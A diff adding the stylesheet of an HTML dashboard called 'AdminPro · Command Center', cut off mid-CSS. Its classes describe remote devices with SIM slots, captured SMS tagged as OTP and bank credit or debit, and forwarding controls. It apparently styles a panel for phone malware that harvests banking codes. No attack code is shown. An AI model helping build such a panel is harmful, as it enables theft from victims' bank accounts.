@@ -1,0 +1,2983 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
+<title>AdminPro · Command Center</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Share+Tech+Mono&display=swap');
+:root{
+  --bg:#f7faf8;--card:#ffffff;--card2:#f1f5f3;--card3:#e9efec;
+  --green:#10b981;--green-2:#34d399;--green-dark:#059669;--green-deep:#047857;
+  --green-bg:#e6f9f0;--green-bg-2:#d1fae5;--green-soft:#f2fdf8;--green-line:#a7f3d0;
+  --gold:#eab308;--gold-bg:#fef9c3;--gold-text:#a16207;
+  --blue:#3b82f6;--blue-bg:#eff6ff;--blue-text:#2563eb;
+  --rose:#ef4444;--rose-bg:#fef2f2;--rose-text:#dc2626;
+  --orange:#f59e0b;--orange-bg:#fff7ed;--orange-text:#d97706;
+  --purple:#8b5cf6;--purple-bg:#f5f3ff;--purple-text:#7c3aed;
+  --pink:#ec4899;--pink-bg:#fdf2f8;--pink-text:#db2777;
+  --text:#0f1e17;--sub:#5a6b62;--dim:#8fa39a;--dim2:#b6c4bc;--border:#e6ece9;
+  --shadow:0 1px 2px rgba(16,24,20,.03),0 4px 14px rgba(16,24,20,.045);
+  --shadow-lg:0 24px 48px rgba(16,24,20,.10);
+  --shadow-panel:0 6px 22px rgba(16,24,20,.07), 0 2px 6px rgba(16,24,20,.04);
+  --mono:'Share Tech Mono',monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{height:100%;height:100dvh;overflow:hidden;background:var(--bg);}
+body{color:var(--text);font-family:'Inter',sans-serif;-webkit-font-smoothing:antialiased;font-size:14px;}
+::-webkit-scrollbar{width:3px;height:3px;}
+::-webkit-scrollbar-thumb{background:var(--dim2);border-radius:3px;}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes modalIn{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
+@keyframes sheetIn{from{opacity:0;transform:translateY(100%)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeUp{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes livePulse{0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,.5)}70%{box-shadow:0 0 0 12px rgba(16,185,129,0)}}
+@keyframes dotBlink{0%,100%{opacity:1}50%{opacity:.3}}
+@keyframes bootSlide{0%{margin-left:-30%}100%{margin-left:100%}}
+@keyframes bootAutoHide{0%,70%{opacity:1;visibility:visible}100%{opacity:0;visibility:hidden;display:none}}
+@keyframes msgFlash{0%{box-shadow:0 0 0 0 rgba(16,185,129,.4)}50%{box-shadow:0 0 0 12px rgba(16,185,129,0)}100%{box-shadow:0 0 0 0 rgba(16,185,129,0)}}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+@keyframes ripple{0%{transform:scale(.9);opacity:.6}100%{transform:scale(1.6);opacity:0}}
+@keyframes radarSweep{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+@keyframes mcScanline{0%{top:0;opacity:0}5%{opacity:.7}95%{opacity:.7}100%{top:100%;opacity:0}}
+@keyframes pingPulse{0%{transform:scale(.95);box-shadow:0 0 0 0 rgba(16,185,129,.6)}50%{transform:scale(1.02)}100%{transform:scale(.95);box-shadow:0 0 0 18px rgba(16,185,129,0)}}
+@keyframes pingWave{0%{transform:scale(.6);opacity:.7}100%{transform:scale(2.2);opacity:0}}
+@keyframes pingSpin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+@keyframes pingRing{0%{transform:scale(.8);opacity:.8}100%{transform:scale(1.8);opacity:0}}
+@keyframes pingShake{0%,100%{transform:translateX(0)}20%{transform:translateX(-3px)}40%{transform:translateX(3px)}60%{transform:translateX(-2px)}80%{transform:translateX(2px)}}
+@keyframes cardPingGlow{0%{box-shadow:0 0 0 0 rgba(16,185,129,.4),0 4px 14px rgba(16,24,20,.06)}50%{box-shadow:0 0 0 12px rgba(16,185,129,0),0 4px 14px rgba(16,24,20,.06)}100%{box-shadow:0 0 0 0 rgba(16,185,129,0),0 4px 14px rgba(16,24,20,.06)}}
+
+#app{display:flex;height:100vh;height:100dvh;flex-direction:column;background:var(--bg);overflow:hidden;}
+
+.lock-screen{position:fixed;inset:0;background:linear-gradient(135deg,#f0fdf6 0%,#e6f9f0 50%,#ffffff 100%);z-index:99999;display:none;align-items:center;justify-content:center;padding:24px;}
+.lock-screen.open{display:flex;animation:fadeIn .3s;}
+.lock-box{background:#fff;border-radius:26px;padding:34px 26px 28px;box-shadow:0 24px 60px rgba(16,24,20,.14);max-width:400px;width:100%;text-align:center;border:1px solid var(--border);position:relative;overflow:hidden;}
+.lock-icon-wrap{position:relative;display:inline-block;margin-bottom:20px;}
+.lock-icon{width:78px;height:78px;border-radius:24px;background:linear-gradient(135deg,var(--green),var(--green-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-size:34px;box-shadow:0 12px 28px rgba(16,185,129,.4);position:relative;z-index:1;}
+.lock-icon.fp{background:linear-gradient(135deg,#8b5cf6,#7c3aed);}
+.lock-icon.tg{background:linear-gradient(135deg,#60a5fa,#2563eb);}
+.lock-ripple{position:absolute;inset:-8px;border-radius:30px;border:2px solid var(--green);animation:ripple 1.6s ease-out infinite;pointer-events:none;opacity:.6;}
+.lock-title{font-size:20px;font-weight:900;color:var(--text);margin-bottom:6px;}
+.lock-sub{font-size:12.5px;color:var(--dim);font-weight:600;margin-bottom:22px;line-height:1.55;padding:0 8px;}
+.lock-btn{width:100%;padding:14px;border-radius:14px;border:none;background:linear-gradient(135deg,var(--green),var(--green-dark));color:#fff;font-family:'Inter',sans-serif;font-size:14px;font-weight:800;cursor:pointer;box-shadow:0 10px 24px rgba(16,185,129,.32);display:flex;align-items:center;justify-content:center;gap:8px;transition:transform .15s;margin-bottom:10px;}
+.lock-btn:active{transform:scale(.97);}
+.lock-btn.purple{background:linear-gradient(135deg,#8b5cf6,#7c3aed);}
+.lock-btn.blue{background:linear-gradient(135deg,#3b82f6,#2563eb);}
+.lock-btn.ghost{background:#fff;border:1.5px solid var(--border);color:var(--sub);box-shadow:none;}
+.otp-input{width:100%;padding:16px 14px;background:var(--card2);border:2px solid transparent;border-radius:14px;font-family:var(--mono);font-size:26px;font-weight:800;letter-spacing:10px;text-align:center;outline:none;color:var(--text);margin-bottom:12px;transition:all .2s;}
+.otp-input:focus{border-color:var(--green);background:#fff;box-shadow:0 0 0 4px rgba(16,185,129,.12);}
+.lock-err{color:var(--rose-text);font-size:12px;font-weight:700;margin-bottom:12px;padding:10px;background:var(--rose-bg);border-radius:10px;border:1px solid #fecaca;display:none;}
+.lock-err.show{display:block;animation:shake .4s;}
+.lock-timer{font-size:11.5px;color:var(--dim);font-weight:600;margin-bottom:14px;font-family:var(--mono);}
+.lock-badge{position:absolute;top:16px;right:16px;font-size:10px;font-weight:800;padding:5px 10px;border-radius:14px;background:var(--green-bg);color:var(--green-deep);letter-spacing:.4px;text-transform:uppercase;}
+
+#boot{position:fixed;inset:0;background:#fff;z-index:9998;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;animation:bootAutoHide 1.3s ease-in forwards;}
+#boot.hidden{display:none;}
+.boot-logo{width:82px;height:82px;border-radius:24px;background:linear-gradient(135deg,var(--green),var(--green-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-size:34px;font-weight:900;box-shadow:0 20px 40px rgba(16,185,129,.35);}
+.boot-txt{font-size:13px;font-weight:800;color:var(--green-dark);letter-spacing:3px;text-transform:uppercase;}
+.boot-bar{width:170px;height:3px;background:#eef2f0;border-radius:3px;overflow:hidden;}
+.boot-bar-in{height:100%;width:30%;background:var(--green);border-radius:3px;animation:bootSlide 1s ease-in-out infinite;}
+
+.tb{background:#fff;height:62px;display:flex;align-items:center;gap:11px;padding:0 14px;flex-shrink:0;position:relative;z-index:999;border-bottom:1px solid #f1f5f3;box-shadow:0 1px 3px rgba(16,24,20,.03);}
+.tb-menu{width:40px;height:40px;border-radius:13px;background:var(--green-bg);display:flex;align-items:center;justify-content:center;color:var(--green-deep);cursor:pointer;flex-shrink:0;font-size:17px;font-weight:800;border:none;}
+.tb-brand{display:flex;align-items:flex-start;gap:9px;flex:1;min-width:0;flex-direction:column;justify-content:center;}
+.tb-brand-row{display:flex;align-items:center;gap:7px;}
+.tb-shield{width:16px;height:16px;color:var(--green-dark);font-size:13px;line-height:1;}
+.tb-title{font-size:15px;font-weight:800;color:var(--text);line-height:1;letter-spacing:-.2px;}
+.tb-subtitle{font-size:8px;font-weight:800;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-top:4px;display:flex;align-items:center;gap:5px;padding-left:23px;}
+.tb-conn-dot{width:5px;height:5px;border-radius:50%;background:#fbbf24;animation:dotBlink 1s infinite;}
+.tb-conn-dot.live{background:var(--green);box-shadow:0 0 6px var(--green);animation:livePulse 2s infinite;}
+.tb-conn-dot.off{background:var(--rose);animation:none;}
+.tb-right{display:flex;gap:8px;align-items:center;}
+.tb-circle{width:38px;height:38px;border-radius:50%;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0;}
+.tb-circle.outline{background:#fff;border:1px solid var(--border);color:var(--sub);}
+
+.body{display:flex;flex:1;overflow:hidden;flex-direction:column;position:relative;}
+.tab-body{flex:1;overflow-y:auto;padding:14px 14px 96px;-webkit-overflow-scrolling:touch;overscroll-behavior:contain;background:var(--bg);}
+
+.wcard{background:linear-gradient(135deg,#f8fefb 0%,#effaf4 100%);border-radius:22px;padding:18px;box-shadow:var(--shadow);border:1px solid #e6f5ed;position:relative;overflow:hidden;margin-bottom:14px;}
+.wcard::before{content:'';position:absolute;top:-50px;right:-50px;width:160px;height:160px;background:radial-gradient(circle,rgba(16,185,129,.09),transparent 65%);border-radius:50%;pointer-events:none;}
+.wcard-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:12px;position:relative;z-index:1;}
+.wcard-icon{width:52px;height:52px;border-radius:16px;background:linear-gradient(135deg,var(--green),var(--green-dark));display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;font-weight:900;box-shadow:0 8px 20px rgba(16,185,129,.3);}
+.gold-badge{display:flex;align-items:center;gap:5px;background:#fef9c3;border:1px solid #fde68a;color:var(--gold-text);font-size:10px;font-weight:800;padding:7px 12px;border-radius:20px;letter-spacing:.6px;text-transform:uppercase;}
+.wcard-label{font-size:10px;font-weight:800;color:var(--dim);letter-spacing:2px;text-transform:uppercase;margin-bottom:5px;}
+.wcard-title{font-size:24px;font-weight:900;color:var(--text);letter-spacing:-.7px;margin-bottom:14px;}
+.wcard-row{display:flex;align-items:center;justify-content:space-between;background:#fff;border:1px solid var(--border);border-radius:12px;padding:11px 14px;margin-bottom:10px;font-size:12px;font-weight:700;color:var(--sub);}
+.wcard-row-left{display:flex;align-items:center;gap:8px;}
+.wcard-row-left .wclock{color:var(--green-dark);font-size:14px;}
+.wcard-row-date{font-size:11px;color:var(--text);font-weight:700;}
+.sync-btn{width:100%;padding:13px;border-radius:12px;border:1.5px solid var(--green-bg-2);background:#fff;color:var(--green-deep);font-family:'Inter',sans-serif;font-size:13px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:all .2s;}
+.sync-btn:active{transform:scale(.98);background:var(--green-soft);}
+
+.stats-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:9px;margin-bottom:14px;}
+.stat-card{background:#fff;border-radius:18px;padding:15px 8px;text-align:center;box-shadow:var(--shadow);border:1px solid var(--border);}
+.stat-icon{width:36px;height:36px;border-radius:12px;background:var(--green-bg);margin:0 auto 9px;display:flex;align-items:center;justify-content:center;font-size:16px;color:var(--green-deep);}
+.stat-card.offline .stat-icon{background:var(--card2);color:var(--sub);}
+.stat-card.offline .stat-val{color:var(--sub);}
+.stat-val{font-size:22px;font-weight:900;letter-spacing:-.6px;color:var(--green-dark);line-height:1;margin-bottom:6px;}
+.stat-lbl{font-size:9px;font-weight:800;color:var(--dim);letter-spacing:1.2px;text-transform:uppercase;}
+
+.quick-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:9px;margin-bottom:14px;}
+.qcard{background:#fff;border-radius:18px;padding:15px 8px;text-align:center;box-shadow:var(--shadow);border:1px solid var(--border);cursor:pointer;transition:transform .15s;}
+.qcard:active{transform:scale(.96);}
+.qcard-icon{width:40px;height:40px;border-radius:13px;background:var(--green-bg);margin:0 auto 10px;display:flex;align-items:center;justify-content:center;font-size:17px;color:var(--green-deep);}
+.qcard-title{font-size:12px;font-weight:800;color:var(--text);margin-bottom:3px;}
+.qcard-sub{font-size:9.5px;color:var(--dim);font-weight:600;}
+
+.fw-bar{background:#fff;border-radius:16px;padding:15px 16px;display:flex;align-items:center;gap:13px;box-shadow:var(--shadow);border:1px solid var(--border);margin-bottom:16px;cursor:pointer;}
+.fw-bar:active{transform:scale(.985);}
+.fw-icon{width:42px;height:42px;border-radius:13px;background:linear-gradient(135deg,#fce7f3,#fbcfe8);display:flex;align-items:center;justify-content:center;color:#db2777;font-size:17px;flex-shrink:0;}
+.fw-info{flex:1;min-width:0;}
+.fw-title{font-size:13.5px;font-weight:800;color:var(--text);margin-bottom:3px;}
+.fw-sub{font-size:11.5px;color:var(--dim);font-family:var(--mono);font-weight:600;}
+
+.sec-hdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:11px;padding:2px;}
+.sec-title{font-size:15.5px;font-weight:800;color:var(--text);letter-spacing:-.3px;}
+.sec-link{font-size:12px;font-weight:800;color:var(--green-dark);cursor:pointer;}
+
+.info-card{background:#fff;border-radius:16px;padding:16px;display:flex;align-items:center;gap:13px;box-shadow:var(--shadow);border:1px solid var(--border);margin-bottom:11px;cursor:pointer;}
+.info-icon{width:42px;height:42px;border-radius:13px;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;}
+.info-icon.gold{background:var(--gold-bg);color:var(--gold-text);}
+.info-icon.pink{background:var(--pink-bg);color:var(--pink-text);}
+.info-body{flex:1;min-width:0;}
+.info-title{font-size:14px;font-weight:800;color:var(--text);margin-bottom:3px;}
+.info-sub{font-size:11.5px;color:var(--dim);font-weight:600;}
+.info-arrow{color:var(--green-dark);font-size:18px;font-weight:800;flex-shrink:0;}
+
+.cap-hdr{font-size:11px;font-weight:800;color:var(--green-dark);letter-spacing:2px;text-transform:uppercase;margin:16px 4px 11px;display:flex;align-items:center;gap:9px;}
+.cap-hdr::before{content:'⚡';font-size:14px;color:var(--green);}
+.cap-grid{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:16px;}
+.cap-card{background:#fff;border-radius:16px;padding:14px;box-shadow:var(--shadow);border:1px solid var(--border);}
+.cap-icon{font-size:18px;margin-bottom:9px;display:block;}
+.cap-icon.green{color:var(--green-dark);}
+.cap-icon.pink{color:var(--pink-text);}
+.cap-icon.gold{color:var(--gold-text);}
+.cap-title{font-size:12.5px;font-weight:800;color:var(--text);margin-bottom:4px;}
+.cap-sub{font-size:10px;color:var(--dim);font-weight:600;line-height:1.4;}
+
+.premium-card{background:linear-gradient(180deg,#f8fefb 0%,#ffffff 100%);border-radius:22px;padding:22px 18px;text-align:center;box-shadow:var(--shadow);border:1px solid #e6f5ed;margin-bottom:14px;}
+.premium-badge{display:inline-flex;align-items:center;gap:6px;background:var(--green-bg);color:var(--green-deep);font-size:10px;font-weight:800;padding:6px 14px;border-radius:20px;letter-spacing:2px;text-transform:uppercase;margin-bottom:14px;}
+.premium-price{font-size:42px;font-weight:900;color:var(--green-dark);letter-spacing:-1.5px;line-height:1;margin-bottom:4px;}
+.premium-price small{font-size:16px;font-weight:700;color:var(--dim);}
+.premium-features{display:flex;flex-wrap:wrap;justify-content:center;gap:9px 14px;margin:18px 0;font-size:11.5px;font-weight:700;color:var(--sub);}
+.premium-feature{display:flex;align-items:center;gap:5px;}
+.premium-feature::before{content:'✓';color:var(--green);font-weight:900;font-size:12px;}
+.premium-btn{width:100%;padding:14px;border-radius:13px;border:none;background:linear-gradient(135deg,var(--green),var(--green-dark));color:#fff;font-family:'Inter',sans-serif;font-size:14px;font-weight:800;cursor:pointer;box-shadow:0 10px 24px rgba(16,185,129,.32);display:flex;align-items:center;justify-content:center;gap:8px;}
+
+.dev-list{display:flex;flex-direction:column;gap:11px;}
+.dev-card{background:#fff;border-radius:18px;padding:15px;box-shadow:var(--shadow);border:1px solid var(--border);cursor:pointer;transition:box-shadow .3s;}
+.dev-card:active{transform:scale(.985);}
+.dev-card.ping-glow{animation:cardPingGlow .8s ease-out;}
+.dc-top{display:flex;align-items:flex-start;gap:11px;margin-bottom:11px;}
+.dc-av{width:46px;height:46px;border-radius:13px;background:var(--card3);display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:900;color:var(--sub);flex-shrink:0;position:relative;border:1px solid var(--border);}
+.dc-av.active{background:linear-gradient(135deg,var(--green),var(--green-dark));color:#fff;border:none;box-shadow:0 5px 12px rgba(16,185,129,.22);}
+.dc-av .dot{position:absolute;bottom:-2px;right:-2px;width:13px;height:13px;border-radius:50%;border:2.5px solid #fff;}
+.dc-av .dot.on{background:var(--green);animation:livePulse 2s infinite;}
+.dc-av .dot.off{background:var(--rose);}
+.dc-info{flex:1;min-width:0;}
+.dc-name{font-size:14px;font-weight:800;color:var(--text);margin-bottom:3px;line-height:1.2;word-break:break-word;}
+.dc-id{font-size:10.5px;color:var(--dim);font-family:var(--mono);font-weight:600;}
+.dc-right{display:flex;flex-direction:column;align-items:flex-end;gap:6px;flex-shrink:0;}
+.dc-status{font-size:9px;font-weight:800;padding:4px 9px;border-radius:14px;letter-spacing:.4px;text-transform:uppercase;display:flex;align-items:center;gap:4px;}
+.dc-status.on{background:var(--green-bg);color:var(--green-deep);}
+.dc-status.off{background:var(--rose-bg);color:var(--rose-text);}
+.dc-status .dotb{width:5px;height:5px;border-radius:50%;background:currentColor;}
+.dc-tags{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;}
+.dc-tag{font-size:10px;font-weight:700;padding:5px 10px;border-radius:9px;background:var(--green-bg);color:var(--green-deep);display:inline-flex;align-items:center;gap:4px;}
+.dc-tag.purple{background:var(--purple-bg);color:var(--purple-text);}
+.dc-tag.fwd-on{background:linear-gradient(135deg,#a7f3d0,#6ee7b7);color:var(--green-deep);border:1px solid var(--green-line);}
+.dc-tag.fwd-off{background:var(--card2);color:var(--dim);border:1px dashed var(--border);}
+.dc-specs{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:10px;font-size:11.5px;font-weight:700;color:var(--sub);}
+.dc-spec{display:flex;align-items:center;gap:5px;}
+.dc-spec .sval{font-family:var(--mono);font-weight:700;color:var(--text);}
+.dc-spec.batt .sval{color:var(--green-dark);}
+.dc-sims{display:flex;flex-direction:column;gap:6px;margin-bottom:11px;}
+.dc-sim{display:flex;align-items:center;gap:8px;font-size:10.5px;font-weight:700;font-family:var(--mono);color:var(--sub);}
+.dc-sim .simtag{width:32px;height:16px;border-radius:4px;background:linear-gradient(135deg,#fb7185,#f43f5e);display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:8.5px;font-weight:800;flex-shrink:0;}
+.dc-sim .simtag.s2{background:linear-gradient(135deg,#818cf8,#6366f1);}
+.dc-actions{display:flex;gap:6px;padding-top:11px;border-top:1px solid #f1f5f3;}
+.dc-btn{flex:1;padding:7px 4px;border-radius:9px;border:1px solid var(--border);background:#fff;font-family:'Inter',sans-serif;font-size:9.5px;font-weight:700;color:var(--sub);cursor:pointer;display:flex;align-items:center;justify-content:center;gap:4px;transition:all .15s;position:relative;overflow:hidden;}
+.dc-btn:active{transform:scale(.94);}
+.dc-btn .dbico{font-size:11px;}
+.dc-btn.green{color:var(--green-deep);border-color:var(--green-line);background:var(--green-soft);}
+.dc-btn.red{color:var(--rose-text);border-color:#fecaca;background:var(--rose-bg);}
+.dc-btn.pinging{background:var(--green)!important;color:#fff!important;border-color:var(--green)!important;animation:pingShake .5s;}
+.dc-btn.pinging .dbico{animation:pingSpin 1s linear infinite;}
+.dc-btn.pinging::after{content:'';position:absolute;inset:0;border-radius:9px;border:2px solid rgba(16,185,129,.6);animation:pingRing .8s ease-out infinite;}
+
+.chip-row{display:flex;gap:7px;overflow-x:auto;padding:2px 2px 10px;scrollbar-width:none;margin-bottom:2px;}
+.chip-row::-webkit-scrollbar{height:0;}
+.chip-row.small{padding-bottom:8px;margin-bottom:4px;}
+.chip{padding:8px 14px;border-radius:22px;background:#fff;border:1px solid var(--border);font-size:12px;font-weight:700;color:var(--sub);cursor:pointer;white-space:nowrap;flex-shrink:0;transition:all .2s;font-family:'Inter',sans-serif;display:inline-flex;align-items:center;gap:6px;}
+.chip.active{background:var(--green);color:#fff;border-color:var(--green);box-shadow:0 5px 14px rgba(16,185,129,.28);}
+.chip.active.purple{background:var(--purple);border-color:var(--purple);box-shadow:0 5px 14px rgba(139,92,246,.28);}
+.chip .chip-count{background:var(--card2);color:var(--sub);font-size:10.5px;padding:1px 7px;border-radius:9px;font-weight:800;}
+.chip.active .chip-count{background:rgba(255,255,255,.28);color:#fff;}
+.sort-chip{padding:8px 12px;border-radius:22px;background:#fff;border:1px solid var(--border);font-size:11.5px;font-weight:700;color:var(--sub);cursor:pointer;white-space:nowrap;flex-shrink:0;display:inline-flex;align-items:center;gap:5px;}
+
+.bank-list{display:flex;flex-direction:column;gap:4px;margin-bottom:10px;}
+.bank-line{display:flex;align-items:center;justify-content:space-between;gap:8px;padding:5px 10px;border-radius:7px;background:linear-gradient(135deg,#f8fefb,#effaf4);border:1px solid #d9f2e6;}
+.bank-line .b-name{flex:1;min-width:0;font-size:8.5px;font-weight:800;color:var(--green-deep);text-transform:uppercase;letter-spacing:.2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.bank-line .b-amt{flex-shrink:0;font-size:10.5px;font-weight:900;color:var(--text);font-family:var(--mono);}
+
+.search-box{display:flex;align-items:center;gap:9px;background:#fff;border:1px solid var(--border);border-radius:13px;padding:12px 15px;margin-bottom:12px;transition:all .2s;}
+.search-box:focus-within{border-color:var(--green);box-shadow:0 0 0 3px rgba(16,185,129,.1);}
+.search-box .search-ico{color:var(--dim);font-size:15px;}
+.search-box input{flex:1;border:none;outline:none;background:none;font-family:'Inter',sans-serif;font-size:13.5px;color:var(--text);min-width:0;font-weight:500;}
+.search-box input::placeholder{color:var(--dim);font-weight:500;}
+
+.page-head{display:flex;align-items:center;gap:12px;margin-bottom:14px;padding:4px 2px;}
+.ph-icon{width:44px;height:44px;border-radius:13px;background:var(--green-bg);display:flex;align-items:center;justify-content:center;color:var(--green-deep);font-size:19px;flex-shrink:0;}
+.ph-body{flex:1;min-width:0;}
+.ph-title{font-size:19px;font-weight:900;letter-spacing:-.4px;color:var(--text);line-height:1.1;}
+.ph-sub{font-size:11.5px;color:var(--dim);font-weight:600;margin-top:3px;}
+.ph-right{display:flex;gap:6px;align-items:center;flex-shrink:0;}
+.count-pill{padding:7px 12px;border-radius:22px;font-size:11px;font-weight:800;display:flex;align-items:center;gap:5px;}
+.count-pill.on{background:var(--green-bg);color:var(--green-deep);}
+.count-pill.off{background:var(--card2);color:var(--sub);}
+
+.msg-card{background:#fff;border-radius:16px;padding:14px;box-shadow:var(--shadow);border:1px solid var(--border);margin-bottom:10px;cursor:pointer;}
+.msg-card.flash{animation:msgFlash 2s;}
+.msg-head{display:flex;align-items:center;gap:8px;margin-bottom:9px;flex-wrap:wrap;}
+.msg-sender{font-size:12.5px;font-weight:800;color:var(--green-deep);font-family:var(--mono);}
+.msg-dev-tag{font-size:9.5px;font-weight:700;padding:3px 8px;border-radius:8px;background:var(--card2);color:var(--sub);max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.msg-cat{font-size:9.5px;font-weight:800;padding:4px 9px;border-radius:9px;letter-spacing:.5px;text-transform:uppercase;}
+.msg-cat.credit{background:var(--green-bg);color:var(--green-deep);}
+.msg-cat.debit{background:var(--rose-bg);color:var(--rose-text);}
+.msg-cat.otp{background:var(--blue-bg);color:var(--blue-text);}
+.msg-cat.bank{background:var(--purple-bg);color:var(--purple-text);}
+.msg-cat.other{background:var(--card2);color:var(--sub);}
+.msg-amount{margin-left:auto;font-size:12.5px;font-weight:900;font-family:var(--mono);}
+.msg-amount.credit{color:var(--green-deep);}
+.msg-amount.debit{color:var(--rose-text);}
+.msg-time{font-size:10.5px;color:var(--dim);font-family:var(--mono);font-weight:600;white-space:nowrap;}
+.msg-body{font-size:12.5px;color:var(--text);line-height:1.55;margin-bottom:10px;word-break:break-word;}
+.msg-foot{display:flex;align-items:center;gap:8px;padding-top:9px;border-top:1px solid #f3f7f5;}
+.msg-sim{font-size:10px;padding:4px 9px;background:var(--card2);border-radius:7px;color:var(--sub);font-family:var(--mono);font-weight:700;}
+.msg-hash{font-size:10px;color:var(--dim);font-family:var(--mono);font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1;}
+.msg-acts{display:flex;gap:6px;}
+.msg-act{width:28px;height:28px;border-radius:8px;background:var(--card2);border:none;color:var(--sub);cursor:pointer;font-size:12px;display:flex;align-items:center;justify-content:center;}
+.msg-act.del{background:var(--rose-bg);color:var(--rose-text);}
+.msg-act.view{background:var(--green-bg);color:var(--green-deep);}
+
+.dp-card{background:#fff;border-radius:20px;padding:16px;box-shadow:var(--shadow);border:1px solid var(--border);margin-bottom:12px;}
+.dp-top{display:flex;align-items:flex-start;gap:12px;margin-bottom:12px;}
+.dp-av{width:54px;height:54px;border-radius:15px;background:linear-gradient(135deg,var(--green),var(--green-dark));display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;color:#fff;flex-shrink:0;position:relative;box-shadow:0 7px 16px rgba(16,185,129,.25);}
+.dp-av .dp-dot{position:absolute;bottom:-3px;right:-3px;width:15px;height:15px;border-radius:50%;border:3px solid #fff;}
+.dp-av .dp-dot.on{background:var(--green);animation:livePulse 2s infinite;}
+.dp-av .dp-dot.off{background:var(--rose);}
+.dp-info{flex:1;min-width:0;}
+.dp-name{font-size:15px;font-weight:900;color:var(--text);margin-bottom:4px;line-height:1.2;}
+.dp-user{font-size:11px;color:var(--sub);font-weight:700;margin-bottom:4px;}
+.dp-id{font-size:10.5px;color:var(--dim);font-family:var(--mono);margin-bottom:7px;font-weight:600;word-break:break-all;}
+.dp-pills{display:flex;gap:6px;flex-wrap:wrap;}
+.dp-pill{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:800;padding:4px 9px;border-radius:12px;letter-spacing:.3px;text-transform:uppercase;}
+.dp-pill.online{background:var(--green-bg);color:var(--green-deep);}
+.dp-pill.offline{background:var(--rose-bg);color:var(--rose-text);}
+.dp-pill.batt{background:var(--gold-bg);color:var(--gold-text);text-transform:none;font-family:var(--mono);}
+.dp-pill.net{background:var(--blue-bg);color:var(--blue-text);text-transform:none;font-family:var(--mono);}
+.dp-sims{display:flex;flex-direction:column;gap:7px;}
+.dp-sim{display:flex;align-items:center;gap:10px;background:var(--card2);border-radius:11px;padding:10px 12px;}
+.dp-sim-ico{width:28px;height:28px;border-radius:8px;background:linear-gradient(135deg,#fb7185,#f43f5e);display:flex;align-items:center;justify-content:center;color:#fff;font-size:11px;flex-shrink:0;font-weight:800;}
+.dp-sim-ico.s2{background:linear-gradient(135deg,#818cf8,#6366f1);}
+.dp-sim-txt{flex:1;font-size:11px;font-weight:700;color:var(--text);min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:var(--mono);}
+
+.act-row{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:6px;margin-bottom:12px;}
+.act-btn{padding:11px 4px;border-radius:13px;border:none;font-family:'Inter',sans-serif;font-size:9.5px;font-weight:800;color:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:4px;height:42px;position:relative;overflow:hidden;transition:transform .15s;flex-direction:column;}
+.act-btn:active{transform:scale(.96);}
+.act-btn .ab-ico{font-size:14px;line-height:1;transition:transform .2s;}
+.act-btn.ping{background:linear-gradient(135deg,var(--green),var(--green-dark));box-shadow:0 6px 18px rgba(16,185,129,.28);}
+.act-btn.ping.active{animation:pingPulse 1s ease-in-out infinite;}
+.act-btn.ping.active .ab-ico{animation:pingSpin 1.2s linear infinite;}
+.act-btn.ping.active::after{content:'';position:absolute;inset:0;border-radius:13px;border:2px solid rgba(16,185,129,.5);animation:pingWave 1s ease-out infinite;}
+.act-btn.sms{background:linear-gradient(135deg,#a78bfa,#8b5cf6);box-shadow:0 6px 18px rgba(139,92,246,.28);}
+.act-btn.fwd{background:linear-gradient(135deg,#60a5fa,#3b82f6);box-shadow:0 6px 18px rgba(59,130,246,.28);}
+.act-btn.smsfwd{background:linear-gradient(135deg,#f472b6,#db2777);box-shadow:0 6px 18px rgba(219,39,119,.28);}
+
+.sub-tabs-wrap{background:#fff;border:1.5px solid var(--border);border-radius:16px;padding:7px;box-shadow:var(--shadow);margin-bottom:12px;}
+.sub-tabs{display:flex;gap:6px;overflow-x:auto;scrollbar-width:none;padding:0;}
+.sub-tabs::-webkit-scrollbar{height:0;}
+.sub-tab{padding:10px 16px;border-radius:12px;background:transparent;border:none;font-size:12px;font-weight:800;color:var(--sub);cursor:pointer;white-space:nowrap;flex-shrink:0;display:inline-flex;align-items:center;gap:6px;transition:all .2s;font-family:'Inter',sans-serif;flex:1;justify-content:center;}
